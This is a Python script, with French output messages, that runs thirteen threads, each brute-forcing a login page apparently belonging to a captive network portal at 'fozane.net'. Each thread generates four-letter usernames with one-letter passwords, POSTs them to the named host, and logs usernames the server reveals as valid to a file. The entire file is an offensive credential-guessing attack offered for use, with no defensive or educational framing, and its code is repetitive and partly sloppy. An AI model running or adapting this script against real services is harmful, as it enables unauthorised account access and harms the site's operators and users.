import requests
import time
import threading
last=0
def crack():
    letra=['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','v','w','u','x','y','z','']
    lettre=[]
    longa=26
    long=longa
    bou=1
    repo5=4
    lettre=letra
    num=4
    long2=0
    long3=0
    rec=1
    x,y,z,u=0,0,0,last
    if rec==1:
        long2=0
        long3=2
    elif 2<=rec<=26:
        long2=rec
        long3=rec+2
    x=long2
    while 1:
        bou=1
        user=(lettre[x]+lettre[y]+lettre[z]+lettre[u])
        paz=lettre[x]
        payload = dict(username=user, password=paz)  
        x+=1
        if x==long3:
                x=long2
                y+=1
                if num==1:
                        break
                else:
                        pass
        elif y==long:
                x=long2
                y=0
                z+=1
                if num==2:
                        break
                else:
                        pass
        elif z==long:
                x=long2
                y=0
                z=0
                u+=1
                if num==3:
                        break
                else :
                        pass
        elif u==long:
                if num==4:
                        break
        while bou:
            try:
                r = requests.post('http://fozane.net/login?dst=http%3A%2F%2Fwww.msftconnecttest.com%2Fredirect', data=payload)
                bou=0
            except :
                print("connexion non etablie, reconnexion...")
        
        if "invalid password" in r.text:
            print("login et password trouver : {},{}".format(user,user))
            fd=open("login_found.txt",'a')
            fd.write(user+":"+user)
            fd.close()
        else :
            print("login {} incorrect".format(user))
def crack2():
    letra=['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','v','w','u','x','y','z','']
    lettre=[]
    longa=26
    long=longa
    bou=1
    repo5=4
    lettre=letra
    num=4
    long2=0
    long3=0
    rec=2
    x,y,z,u=0,0,0,last
    if rec==1:
        long2=0
        long3=2
    elif 2<=rec<=26:
        long2=rec
        long3=rec+2
    x=long2
    while 1:
        bou=1
        user=(lettre[x]+lettre[y]+lettre[z]+lettre[u])
        paz=lettre[x]
        payload = dict(username=user, password=paz)  
        x+=1
        if x==long3:
                x=long2
                y+=1
                if num==1:
                        break
                else:
                        pass
        elif y==long:
                x=long2
                y=0
                z+=1
                if num==2:
                        break
                else:
                        pass
        elif z==long:
                x=long2
                y=0
                z=0
                u+=1
                if num==3:
                        break
                else :
                        pass
        elif u==long:
                if num==4:
                        break
        while bou:
            try:
                r = requests.post('http://fozane.net/login?dst=http%3A%2F%2Fwww.msftconnecttest.com%2Fredirect', data=payload)
                bou=0
            except :
                print("connexion non etablie, reconnexion...")
        
        if "invalid password" in r.text:
            print("login et password trouver : {},{}".format(user,user))
            fd=open("login_found.txt",'a')
            fd.write(user+":"+user)
            fd.close()
        else :
            print("login {} incorrect".format(user))
def crack3():
    letra=['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','v','w','u','x','y','z','']
    lettre=[]
    longa=26
    long=longa
    bou=1
    repo5=4
    lettre=letra
    num=4
    long2=0
    long3=0
    rec=4
    x,y,z,u=0,0,0,last
    if rec==1:
        long2=0
        long3=2
    elif 2<=rec<=26:
        long2=rec
        long3=rec+2
    x=long2
    while 1:
        bou=1
        user=(lettre[x]+lettre[y]+lettre[z]+lettre[u])
        paz=lettre[x]
        payload = dict(username=user, password=paz)  
        x+=1
        if x==long3:
                x=long2
                y+=1
                if num==1:
                        break
                else:
                        pass
        elif y==long:
                x=long2
                y=0
                z+=1
                if num==2:
                        break
                else:
                        pass
        elif z==long:
                x=long2
                y=0
                z=0
                u+=1
                if num==3:
                        break
                else :
                        pass
        elif u==long:
                if num==4:
                        break
        while bou:
            try:
                r = requests.post('http://fozane.net/login?dst=http%3A%2F%2Fwww.msftconnecttest.com%2Fredirect', data=payload)
                bou=0
            except :
                print("connexion non etablie, reconnexion...")
        
        if "invalid password" in r.text:
            print("login et password trouver : {},{}".format(user,user))
            fd=open("login_found.txt",'a')
            fd.write(user+":"+user)
            fd.close()
        else :
            print("login {} incorrect".format(user))
def crack4():
    letra=['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','v','w','u','x','y','z','']
    lettre=[]
    longa=26
    long=longa
    bou=1
    repo5=4
    lettre=letra
    num=4
    long2=0
    long3=0
    rec=6
    x,y,z,u=0,0,0,last
    if rec==1:
        long2=0
        long3=2
    elif 2<=rec<=26:
        long2=rec
        long3=rec+2
    x=long2
    while 1:
        bou=1
        user=(lettre[x]+lettre[y]+lettre[z]+lettre[u])
        paz=lettre[x]
        payload = dict(username=user, password=paz)  
        x+=1
        if x==long3:
                x=long2
                y+=1
                if num==1:
                        break
                else:
                        pass
        elif y==long:
                x=long2
                y=0
                z+=1
                if num==2:
                        break
                else:
                        pass
        elif z==long:
                x=long2
                y=0
                z=0
                u+=1
                if num==3:
                        break
                else :
                        pass
        elif u==long:
                if num==4:
                        break
        while bou:
            try:
                r = requests.post('http://fozane.net/login?dst=http%3A%2F%2Fwww.msftconnecttest.com%2Fredirect', data=payload)
                bou=0
            except :
                print("connexion non etablie, reconnexion...")
        
        if "invalid password" in r.text:
            print("login et password trouver : {},{}".format(user,user))
            fd=open("login_found.txt",'a')
            fd.write(user+":"+user)
            fd.close()
        else :
            print("login {} incorrect".format(user))
def crack5():
    letra=['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','v','w','u','x','y','z','']
    lettre=[]
    longa=26
    long=longa
    bou=1
    repo5=4
    lettre=letra
    num=4
    long2=0
    long3=0
    rec=8
    x,y,z,u=0,0,0,last
    if rec==1:
        long2=0
        long3=2
    elif 2<=rec<=26:
        long2=rec
        long3=rec+2
    x=long2
    while 1:
        bou=1
        user=(lettre[x]+lettre[y]+lettre[z]+lettre[u])
        paz=lettre[x]
        payload = dict(username=user, password=paz)  
        x+=1
        if x==long3:
                x=long2
                y+=1
                if num==1:
                        break
                else:
                        pass
        elif y==long:
                x=long2
                y=0
                z+=1
                if num==2:
                        break
                else:
                        pass
        elif z==long:
                x=long2
                y=0
                z=0
                u+=1
                if num==3:
                        break
                else :
                        pass
        elif u==long:
                if num==4:
                        break
        while bou:
            try:
                r = requests.post('http://fozane.net/login?dst=http%3A%2F%2Fwww.msftconnecttest.com%2Fredirect', data=payload)
                bou=0
            except :
                print("connexion non etablie, reconnexion...")
        
        if "invalid password" in r.text:
            print("login et password trouver : {},{}".format(user,user))
            fd=open("login_found.txt",'a')
            fd.write(user+":"+user)
            fd.close()
        else :
            print("login {} incorrect".format(user))
def crack6():
    letra=['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','v','w','u','x','y','z','']
    lettre=[]
    longa=26
    long=longa
    bou=1
    repo5=4
    lettre=letra
    num=4
    long2=0
    long3=0
    rec=10
    x,y,z,u=0,0,0,last
    if rec==1:
        long2=0
        long3=2
    elif 2<=rec<=26:
        long2=rec
        long3=rec+2
    x=long2
    while 1:
        bou=1
        user=(lettre[x]+lettre[y]+lettre[z]+lettre[u])
        paz=lettre[x]
        payload = dict(username=user, password=paz)  
        x+=1
        if x==long3:
                x=long2
                y+=1
                if num==1:
                        break
                else:
                        pass
        elif y==long:
                x=long2
                y=0
                z+=1
                if num==2:
                        break
                else:
                        pass
        elif z==long:
                x=long2
                y=0
                z=0
                u+=1
                if num==3:
                        break
                else :
                        pass
        elif u==long:
                if num==4:
                        break
        while bou:
            try:
                r = requests.post('http://fozane.net/login?dst=http%3A%2F%2Fwww.msftconnecttest.com%2Fredirect', data=payload)
                bou=0
            except :
                print("connexion non etablie, reconnexion...")
        
        if "invalid password" in r.text:
            print("login et password trouver : {},{}".format(user,user))
            fd=open("login_found.txt",'a')
            fd.write(user+":"+user)
            fd.close()
        else :
            print("login {} incorrect".format(user))
def crack7():
    letra=['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','v','w','u','x','y','z','']
    lettre=[]
    longa=26
    long=longa
    bou=1
    repo5=4
    lettre=letra
    num=4
    long2=0
    long3=0
    rec=12
    y,z,u=0,0,last
    if rec==1:
        long2=0
        long3=2
    elif 2<=rec<=26:
        long2=rec
        long3=rec+2
    x=long2
    while 1:
        bou=1
        user=(lettre[x]+lettre[y]+lettre[z]+lettre[u])
        paz=lettre[x]
        payload = dict(username=user, password=paz)  
        x+=1
        if x==long3:
                x=long2
                y+=1
                if num==1:
                        break
                else:
                        pass
        elif y==long:
                x=long2
                y=0
                z+=1
                if num==2:
                        break
                else:
                        pass
        elif z==long:
                x=long2
                y=0
                z=0
                u+=1
                if num==3:
                        break
                else :
                        pass
        elif u==long:
                if num==4:
                        break
        while bou:
            try:
                r = requests.post('http://fozane.net/login?dst=http%3A%2F%2Fwww.msftconnecttest.com%2Fredirect', data=payload)
                bou=0
            except :
                print("connexion non etablie, reconnexion...")
        
        if "invalid password" in r.text:
            print("login et password trouver : {},{}".format(user,user))
            fd=open("login_found.txt",'a')
            fd.write(user+":"+user)
            fd.close()
        else :
            print("login {} incorrect".format(user))
def crack8():
    letra=['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','v','w','u','x','y','z','']
    lettre=[]
    longa=26
    long=longa
    bou=1
    repo5=4
    lettre=letra
    num=4
    long2=0
    long3=0
    rec=14
    x,y,z,u=0,0,0,last
    if rec==1:
        long2=0
        long3=2
    elif 2<=rec<=26:
        long2=rec
        long3=rec+2
    x=long2
    while 1:
        bou=1
        user=(lettre[x]+lettre[y]+lettre[z]+lettre[u])
        paz=lettre[x]
        payload = dict(username=user, password=paz)  
        x+=1
        if x==long3:
                x=long2
                y+=1
                if num==1:
                        break
                else:
                        pass
        elif y==long:
                x=long2
                y=0
                z+=1
                if num==2:
                        break
                else:
                        pass
        elif z==long:
                x=long2
                y=0
                z=0
                u+=1
                if num==3:
                        break
                else :
                        pass
        elif u==long:
                if num==4:
                        break
        while bou:
            try:
                r = requests.post('http://fozane.net/login?dst=http%3A%2F%2Fwww.msftconnecttest.com%2Fredirect', data=payload)
                bou=0
            except :
                print("connexion non etablie, reconnexion...")
        
        if "invalid password" in r.text:
            print("login et password trouver : {},{}".format(user,user))
            fd=open("login_found.txt",'a')
            fd.write(user+":"+user)
            fd.close()
        else :
            print("login {} incorrect".format(user))
def crack9():
    letra=['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','v','w','u','x','y','z','']
    lettre=[]
    longa=26
    long=longa
    bou=1
    repo5=4
    lettre=letra
    num=4
    long2=0
    long3=0
    rec=16
    x,y,z,u=0,0,0,last
    if rec==1:
        long2=0
        long3=2
    elif 2<=rec<=26:
        long2=rec
        long3=rec+2
    x=long2
    while 1:
        bou=1
        user=(lettre[x]+lettre[y]+lettre[z]+lettre[u])
        paz=lettre[x]
        payload = dict(username=user, password=paz)  
        x+=1
        if x==long3:
                x=long2
                y+=1
                if num==1:
                        break
                else:
                        pass
        elif y==long:
                x=long2
                y=0
                z+=1
                if num==2:
                        break
                else:
                        pass
        elif z==long:
                x=long2
                y=0
                z=0
                u+=1
                if num==3:
                        break
                else :
                        pass
        elif u==long:
                if num==4:
                        break
        while bou:
            try:
                r = requests.post('http://fozane.net/login?dst=http%3A%2F%2Fwww.msftconnecttest.com%2Fredirect', data=payload)
                bou=0
            except :
                print("connexion non etablie, reconnexion...")
        
        if "invalid password" in r.text:
            print("login et password trouver : {},{}".format(user,user))
            fd=open("login_found.txt",'a')
            fd.write(user+":"+user)
            fd.close()
        else :
            print("login {} incorrect".format(user))
def crack10():
    letra=['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','v','w','u','x','y','z','']
    lettre=[]
    longa=26
    long=longa
    bou=1
    repo5=4
    lettre=letra
    num=4
    long2=0
    long3=0
    rec=18
    x,y,z,u=0,0,0,last
    if rec==1:
        long2=0
        long3=2
    elif 2<=rec<=26:
        long2=rec
        long3=rec+2
    x=long2
    while 1:
        bou=1
        user=(lettre[x]+lettre[y]+lettre[z]+lettre[u])
        paz=lettre[x]
        payload = dict(username=user, password=paz)  
        x+=1
        if x==long3:
                x=long2
                y+=1
                if num==1:
                        break
                else:
                        pass
        elif y==long:
                x=long2
                y=0
                z+=1
                if num==2:
                        break
                else:
                        pass
        elif z==long:
                x=long2
                y=0
                z=0
                u+=1
                if num==3:
                        break
                else :
                        pass
        elif u==long:
                if num==4:
                        break
        while bou:
            try:
                r = requests.post('http://fozane.net/login?dst=http%3A%2F%2Fwww.msftconnecttest.com%2Fredirect', data=payload)
                bou=0
            except :
                print("connexion non etablie, reconnexion...")
        
        if "invalid password" in r.text:
            print("login et password trouver : {},{}".format(user,user))
            fd=open("login_found.txt",'a')
            fd.write(user+":"+user)
            fd.close()
        else :
            print("login {} incorrect".format(user))
def crack11():
    letra=['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','v','w','u','x','y','z','']
    lettre=[]
    longa=26
    long=longa
    bou=1
    repo5=4
    lettre=letra
    num=4
    long2=0
    long3=0
    rec=20
    x,y,z,u=0,0,0,last
    if rec==1:
        long2=0
        long3=2
    elif 2<=rec<=26:
        long2=rec
        long3=rec+2
    x=long2
    while 1:
        bou=1
        user=(lettre[x]+lettre[y]+lettre[z]+lettre[u])
        paz=lettre[x]
        payload = dict(username=user, password=paz)  
        x+=1
        if x==long3:
                x=long2
                y+=1
                if num==1:
                        break
                else:
                        pass
        elif y==long:
                x=long2
                y=0
                z+=1
                if num==2:
                        break
                else:
                        pass
        elif z==long:
                x=long2
                y=0
                z=0
                u+=1
                if num==3:
                        break
                else :
                        pass
        elif u==long:
                if num==4:
                        break
        while bou:
            try:
                r = requests.post('http://fozane.net/login?dst=http%3A%2F%2Fwww.msftconnecttest.com%2Fredirect', data=payload)
                bou=0
            except :
                print("connexion non etablie, reconnexion...")
        
        if "invalid password" in r.text:
            print("login et password trouver : {},{}".format(user,user))
            fd=open("login_found.txt",'a')
            fd.write(user+":"+user)
            fd.close()
        else :
            print("login {} incorrect".format(user))
def crack12():
    letra=['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','v','w','u','x','y','z','']
    lettre=[]
    longa=26
    long=longa
    bou=1
    repo5=4
    lettre=letra
    num=4
    long2=0
    long3=0
    rec=22
    x,y,z,u=0,0,0,last
    if rec==1:
        long2=0
        long3=2
    elif 2<=rec<=26:
        long2=rec
        long3=rec+2
    x=long2
    while 1:
        bou=1
        user=(lettre[x]+lettre[y]+lettre[z]+lettre[u])
        paz=lettre[x]
        payload = dict(username=user, password=paz)  
        x+=1
        if x==long3:
                x=long2
                y+=1
                if num==1:
                        break
                else:
                        pass
        elif y==long:
                x=long2
                y=0
                z+=1
                if num==2:
                        break
                else:
                        pass
        elif z==long:
                x=long2
                y=0
                z=0
                u+=1
                if num==3:
                        break
                else :
                        pass
        elif u==long:
                if num==4:
                        break
        while bou:
            try:
                r = requests.post('http://fozane.net/login?dst=http%3A%2F%2Fwww.msftconnecttest.com%2Fredirect', data=payload)
                bou=0
            except :
                print("connexion non etablie, reconnexion...")
        
        if "invalid password" in r.text:
            print("login et password trouver : {},{}".format(user,user))
            fd=open("login_found.txt",'a')
            fd.write(user+":"+user)
            fd.close()
        else :
            print("login {} incorrect".format(user))
def crack13():
    letra=['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','v','w','u','x','y','z','']
    lettre=[]
    longa=26
    long=longa
    bou=1
    repo5=4
    lettre=letra
    num=4
    long2=0
    long3=0
    rec=24
    x,y,z,u=0,0,0,last
    if rec==1:
        long2=0
        long3=2
    elif 2<=rec<=26:
        long2=rec
        long3=rec+2
    x=long2
    while 1:
        bou=1
        user=(lettre[x]+lettre[y]+lettre[z]+lettre[u])
        paz=lettre[x]
        payload = dict(username=user, password=paz)  
        x+=1
        if x==long3:
                x=long2
                y+=1
                if num==1:
                        break
                else:
                        pass
        elif y==long:
                x=long2
                y=0
                z+=1
                if num==2:
                        break
                else:
                        pass
        elif z==long:
                x=long2
                y=0
                z=0
                u+=1
                if num==3:
                        break
                else :
                        pass
        elif u==long:
                if num==4:
                        break
        while bou:
            try:
                r = requests.post('http://fozane.net/login?dst=http%3A%2F%2Fwww.msftconnecttest.com%2Fredirect', data=payload)
                bou=0
            except :
                print("connexion non etablie, reconnexion...")
        
        if "invalid password" in r.text:
            print("login et password trouver : {},{}".format(user,user))
            fd=open("login_found.txt",'a')
            fd.write(user+":"+user)
            fd.close()
        else :
            print("login {} incorrect".format(user))

t1=threading.Thread(target=crack)
t2=threading.Thread(target=crack2)
t3=threading.Thread(target=crack3)
t4=threading.Thread(target=crack4)
t5=threading.Thread(target=crack5)
t6=threading.Thread(target=crack6)
t7=threading.Thread(target=crack7)
t8=threading.Thread(target=crack8)
t9=threading.Thread(target=crack9)
t10=threading.Thread(target=crack10)
t11=threading.Thread(target=crack11)
t12=threading.Thread(target=crack12)
t13=threading.Thread(target=crack13)
t1.start()
t2.start()
t3.start()
t4.start()
t5.start()
t6.start()
t7.start()
t8.start()
t9.start()
t10.start()
t11.start()
t12.start()
t13.start()
t1.join()
t2.join()
t3.join()
t4.join()
t5.join()
t6.join()
t7.join()
t8.join()
t9.join()
t10.join()
t11.join()
t12.join()
t13.join()
